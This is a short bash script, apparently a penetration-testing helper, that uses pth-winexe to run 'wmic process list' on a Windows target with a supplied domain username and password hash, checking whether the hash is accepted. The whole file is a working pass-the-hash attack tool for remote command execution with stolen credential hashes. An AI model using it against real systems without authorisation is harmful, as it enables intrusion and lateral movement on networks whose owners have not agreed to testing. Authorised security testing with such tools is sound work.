#!/bin/bash

ShowUsage() {
	echo "Usage: $0 <target system> <username> <password hash>"
	echo "Username should be <DOMAIN>/<User>"
	echo "This script will simply try to run 'wmic process list' on the target to see if it accepts the passed hash."
}

if [ $# -lt 3 ]; then
	ShowUsage
	exit 1
fi

TARGET=$1
USERNAME=$2
PASSWORD="$3"

# -d 6 is a debug level setting so you can see what's going on
pth-winexe -d 1 -U $USERNAME%$PASSWORD //$TARGET "wmic process list"

